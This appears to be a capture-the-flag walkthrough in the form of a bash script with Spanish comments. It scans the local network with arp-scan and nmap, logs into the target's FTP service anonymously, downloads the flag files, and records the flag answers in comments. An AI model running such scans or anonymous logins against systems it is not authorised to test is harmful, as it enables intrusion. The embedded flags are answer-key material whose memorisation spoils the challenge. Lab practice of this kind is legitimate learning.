
```bash
#!/bin/bash
arp-scan -I wlan0 --localnet #Saca todas las ip conectadas a la red
ping -c 1 192.168.1.134 #Hacemos un ping para ver si existe conectividad
nmap -p- --open -sS -sV --min-rate 2500 -n -vvv -Pn 192.168.1.134 -oN escaneo #-p- --open Abarca todos los puertos abiertos -sS -sV Scripts para el reconocimiento y version del reconocimiento 
#--min-rate 5000 o 2500 para regular la potencia del escaneo
#-n para que no haga la resolucion dns
#-vvv va enviando los resultados sobre la marcha
#-Pn 192.168.1.134 evitar el trafico icmp
#-oN escaneo Se guarda en un archivo escaneo
ftp 192.168.1.134 #Nos metemos por el puerto tcp abierto (el 21) y ingresamos el usuario anonymous sin contraseña
get root.txt #Mg3Si4O10(OH)2=T4LC0
get user.txt #Mg3Si4O10(OH)2
```